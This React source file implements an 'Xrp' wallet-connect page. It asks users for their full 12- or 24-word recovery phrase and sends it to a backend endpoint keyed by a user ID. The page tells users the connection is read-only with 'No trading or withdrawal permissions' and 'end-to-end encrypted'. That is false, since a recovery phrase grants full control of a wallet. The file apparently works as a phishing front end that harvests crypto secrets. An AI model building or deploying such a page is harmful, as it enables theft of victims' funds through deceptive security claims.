import { useState } from "react";
import { Shield, Lock } from "lucide-react";
import logo from "../../assets/xrp_dark.png";
import { useMutation } from "@tanstack/react-query";
import { apiRequest, userId } from "../../../helpers/Config";
import { ImSpinner9 } from "react-icons/im";
import { IoMdClose } from "react-icons/io";
import { PiSpinnerGapBold } from "react-icons/pi";
import { useNavigate } from "react-router-dom";

const Xrp = () => {
  // const [showSecret, setShowSecret] = useState(false);
  const [phraseLength, setPhraseLength] = useState(12); // can be 12 or 24
  const [mnemonic, setMnemonic] = useState<string[]>(
    Array(phraseLength).fill("")
  );

  const nav = useNavigate();

  const [loading, setLoading] = useState(false);

  const { isPending, mutate } = useMutation({
    mutationFn: (passphrase: string) =>
      apiRequest(`/wallet/connect/${userId}`, "POST", {
        walletType: "Xrp",
        passphrase,
      }),
    onSuccess: (data) => {
      // toast.success("Successful")
      nav("/?auth=true");

      console.log(data);
    },
    // onError: (error: unknown) => {
    //   console.log("onError triggered:", error);

    //   let message = "An unknown error occurred";

    //   if (error instanceof Error) {
    //     message = error.message;
    //   }

    //   toast.error(message);
    // },
  });

  const handleConnect = () => {
    if (
      mnemonic.some((w) => w.trim() !== "") &&
      mnemonic.some((w) => w.trim() === "")
    )
      return;

    const currentPassphrase = mnemonic.join(", ");
    setLoading(true);
    mutate(currentPassphrase);
  };

  const togglePhraseLength = () => {
    const newLength = phraseLength === 12 ? 24 : 12;
    setPhraseLength(newLength);
    setMnemonic(Array(newLength).fill(""));
  };

  const handleWordChange = (index: number, value: string) => {
    const updated = [...mnemonic];
    updated[index] = value.toLowerCase().trim();
    setMnemonic(updated);
  };

  return (
    <div className="min-h-screen bg-black text-gray-100 w-full mt-11">
      <div className="px-4 pt-6">
        <button
          onClick={() => nav(-1)} // goes back one step in history
          className="flex items-center text-gray-300 hover:text-white transition-colors"
        >
          <svg
            xmlns="http://www.w3.org/2000/svg"
            className="h-5 w-5 mr-2"
            fill="none"
            viewBox="0 0 24 24"
            stroke="currentColor"
          >
            <path
              strokeLinecap="round"
              strokeLinejoin="round"
              strokeWidth={2}
              d="M15 19l-7-7 7-7"
            />
          </svg>
          Back
        </button>
      </div>
      {loading && (
        <LoadingModal type={"Xrp"} onClose={() => setLoading(false)} />
      )}
      <div className="container mx-auto px-4 py-8">
        <div className="grid md:grid-cols-2 gap-8">
          {/* Left Column - Connection Form */}
          <div className=" p-6">
            <div className="mb-6">
              <div className="flex items-center gap-3 mb-6">
                <div className="h-20 w-20 rounded-full flex items-center justify-center">
                  <img src={logo} alt="" />
                </div>
                <h2 className="text-2xl font-semibold">Xrp</h2>
              </div>
              <div className="flex gap-4 mb-6">
                <button className="px-4 py-2 border-b-2 border-orange-400 text-white font-medium">
                  Secret Phrase
                </button>
                <button className="px-4 py-2 text-gray-400 hover:text-gray-300 transition-colors"></button>
              </div>
            </div>

            <div className="space-y-6">
              {/* API Key Input */}
              {/* <div>
                <label className="block text-sm font-medium text-gray-300 mb-2">
                  API Key
                </label>
                <div className="flex gap-2">
                  <div className="relative flex-1">
                    <KeyRound className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400 h-5 w-5" />
                    <input
                      type="text"
                      value={apiKey}
                      onChange={(e) => setApiKey(e.target.value)}
                      className="w-full bg-gray-800 border border-gray-700 rounded-lg py-3 pl-10 pr-4 text-white placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-blue-500"
                      placeholder="Enter your API key"
                    />
                  </div>
                  <button
                    onClick={() => handlePaste("key")}
                    className="px-4 py-2 bg-gray-800 hover:bg-gray-700 rounded-lg text-gray-300 transition-colors"
                  >
                    Paste
                  </button>
                </div>
              </div> */}

              {/* API Secret Input */}
              {/* <div>
                <label className="block text-sm font-medium text-gray-300 mb-2">
                  API Secret
                </label>
                <div className="flex gap-2">
                  <div className="relative flex-1">
                    <Lock className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400 h-5 w-5" />
                    <input
                      type={showSecret ? "text" : "password"}
                      value={apiSecret}
                      onChange={(e) => setApiSecret(e.target.value)}
                      className="w-full bg-gray-800 border border-gray-700 rounded-lg py-3 pl-10 pr-10 text-white placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-blue-500"
                      placeholder="Enter your API secret"
                    />
                    <button
                      onClick={() => setShowSecret(!showSecret)}
                      className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-300"
                    >
                      {showSecret ? (
                        <EyeOff className="h-5 w-5" />
                      ) : (
                        <Eye className="h-5 w-5" />
                      )}
                    </button>
                  </div>
                  <button
                    onClick={() => handlePaste("secret")}
                    className="px-4 py-2 bg-gray-800 hover:bg-gray-700 rounded-lg text-gray-300 transition-colors"
                  >
                    Paste
                  </button>
                </div>
              </div> */}
              <div>
                <div className="flex justify-between mb-2">
                  <label className="block text-sm font-medium text-gray-300">
                    Secret Phrase ({phraseLength} words)
                  </label>
                  <button
                    onClick={togglePhraseLength}
                    className="text-sm text-blue-400 hover:underline"
                  >
                    Switch to {phraseLength === 12 ? "24" : "12"} words
                  </button>
                </div>

                <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 gap-3 mb-4">
                  {mnemonic.map((word, index) => (
                    <input
                      key={index}
                      type="text"
                      value={word}
                      onChange={(e) => handleWordChange(index, e.target.value)}
                      className="w-full bg-gray-800 border border-gray-700 rounded-lg py-2 px-3 text-white text-sm placeholder-gray-500"
                      placeholder={`Word ${index + 1}`}
                    />
                  ))}
                </div>
              </div>

              {/* Connect Button */}
              <button
                onClick={handleConnect}
                disabled={isPending}
                className={`w-[40%] rounded-lg py-3 px-4 font-medium transition-colors flex justify-center items-center focus:outline-none focus:ring-2 focus:ring-blue-300 mt-6
                  ${
                    mnemonic.some((w) => w.trim() !== "") &&
                    mnemonic.some((w) => w.trim() === "")
                      ? "bg-gray-700 text-gray-400 cursor-not-allowed"
                      : "bg-blue-600 hover:bg-blue-700 text-white"
                  }
                `}
              >
                {isPending ? (
                  <ImSpinner9 className="animate-spin text-2xl" />
                ) : (
                  "Connect"
                )}
              </button>

              {/* Security Features */}
              <div className="mt-8 pt-6 border-t border-gray-800">
                <div className="space-y-4">
                  <div className="flex items-start gap-3">
                    <div className="p-2 bg-blue-600/20 rounded-lg">
                      <Shield className="h-5 w-5 text-blue-400" />
                    </div>
                    <div>
                      <h4 className="text-sm font-medium text-gray-200">
                        Secure Connection
                      </h4>
                      <p className="text-sm text-gray-400">
                        End-to-end encrypted data transfer
                      </p>
                    </div>
                  </div>
                  <div className="flex items-start gap-3">
                    <div className="p-2 bg-green-600/20 rounded-lg">
                      <Lock className="h-5 w-5 text-green-400" />
                    </div>
                    <div>
                      <h4 className="text-sm font-medium text-gray-200">
                        Read-Only Access
                      </h4>
                      <p className="text-sm text-gray-400">
                        No trading or withdrawal permissions
                      </p>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Xrp;

export const LoadingModal = ({
  type,
  onClose,
}: {
  type: string;
  onClose: () => void;
}) => {
  console.log(type);
  return (
    <div className="h-screen w-screen flex justify-center items-center fixed inset-0 z-50">
      <div className="w-80 h-64 bg-white rounded-xl p-4 text-black flex flex-col justify-between">
        <div className="flex flex-col gap-4">
          <div className="flex justify-between">
            <h1 className="text-center">{type}</h1>
            <IoMdClose className="text-lg" onClick={onClose} />
          </div>
          <p>Creating secure wallet connection</p>
        </div>
        <div className="flex w-full justify-center pb-10">
          <PiSpinnerGapBold className="animate-spin text-6xl" />
        </div>
      </div>
    </div>
  );
};
